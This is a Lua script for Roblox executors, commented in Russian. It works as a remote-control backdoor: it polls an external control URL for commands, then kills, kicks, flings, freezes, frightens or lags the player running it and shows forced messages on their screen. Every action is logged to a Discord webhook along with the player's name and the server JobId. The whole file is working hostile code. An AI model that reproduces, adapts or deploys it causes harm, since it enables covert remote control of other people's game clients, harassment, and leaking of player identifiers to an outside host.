-- Функция отправки в Discord
local function sendLog(title, desc)
    pcall(function()
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = 0xFF0000,
                ["fields"] = {
                    {["name"] = "👤 Игрок", ["value"] = "||" .. lp.Name .. "||", ["inline"] = true},
                    {["name"] = "🆔 Game ID", ["value"] = tostring(game.JobId), ["inline"] = true}
                },
                ["footer"] = {["text"] = "AxM v37 • " .. os.date("%X")}
            }}
        }
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if req then 
            req({
                Url = settings.webhook, 
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"}, 
                Body = HttpService:JSONEncode(data)
            }) 
        end
    end)
end

-- Логика управления
task.spawn(function()
    local last_cmd = ""
    local flingConnection
    
    -- Первичная загрузка, чтобы не выполнять старую команду сразу при входе
    local _, res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. math.random(1,999999)) end)
    if res then last_cmd = res:gsub("^%s*(.-)%s*$", "%1"):lower() end

    while true do
        task.wait(settings.check_delay)
        
        -- Анти-кэш: добавляем случайный параметр, чтобы Pastebin отдавал новый текст
        local ok, res = pcall(function() 
            return game:HttpGet(settings.control .. "?t=" .. math.random(1,999999)) 
        end)

        if ok then
            local clean_res = res:gsub("^%s*(.-)%s*$", "%1") -- чистка пробелов и переносов
            local current_cmd = clean_res:lower()

            -- Срабатывает только если команда ИЗМЕНИЛАСЬ и это не "safe"
            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                last_cmd = current_cmd
                
                local char = lp.Character or lp.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart", 5)
                local hum = char:FindFirstChildOfClass("Humanoid")

                if hrp and hum then
                    -- [ СПИСОК КОМАНД ] --
                    if current_cmd == "kill" then
                        hum.Health = 0
                        sendLog("💀 УБИЙСТВО", "Персонаж ликвидирован")
                    
                    elseif current_cmd:find("message") then
                        local msg = clean_res:match("%((.-)%)") or "System Alert"
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local t = Instance.new("TextLabel", g)
                        t.Size = UDim2.new(1,0,1,0); t.Text = msg; t.TextScaled = true; t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 0.5; t.BackgroundColor3 = Color3.new(0,0,0)
                        task.delay(7, function() g:Destroy() end)
                        sendLog("📢 СООБЩЕНИЕ", "Текст: " .. msg)

                    elseif current_cmd == "screamer" then
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                        task.delay(3, function() g:Destroy() end)
                        sendLog("😱 СКРИМЕР", "Игрок напуган")

                    elseif current_cmd:find("kick") then
                        local r = clean_res:match("%((.-)%)") or "Lost Connection"
                        sendLog("🚪 КИК", "Причина: "..r)
                        lp:Kick(r)

                    elseif current_cmd == "fling" then
                        if flingConnection then flingConnection:Disconnect() end
                        flingConnection = RunService.Heartbeat:Connect(function()
                            hrp.Velocity = Vector3.new(0, 8000, 0)
                            hrp.RotVelocity = Vector3.new(0, 8000, 0)
                        end)
                        sendLog("🌪️ ФЛИНГ", "Активирован")

                    elseif current_cmd == "unfling" then
                        if flingConnection then flingConnection:Disconnect() end
                        sendLog("🛡️ УНФЛИНГ", "Отключен")

                    elseif current_cmd == "freeze" then
                        hrp.Anchored = true
                        sendLog("🧊 ФРИЗ", "Заморожен")

                    elseif current_cmd == "unfreeze" then
                        hrp.Anchored = false
                        sendLog("🔥 УНФРИЗ", "Разморожен")

                    elseif current_cmd == "horror" then
                        Lighting.ClockTime = 0; Lighting.Brightness = 0
                        sendLog("🌑 ХОРРОР", "Тьма")

                    elseif current_cmd == "lag" then
                        for i=1,1000 do Instance.new("Part", workspace).Position = hrp.Position end
                        sendLog("🐌 ЛАГ", "Спам объектами")
                    end
                end
            end
        end
    end
end)

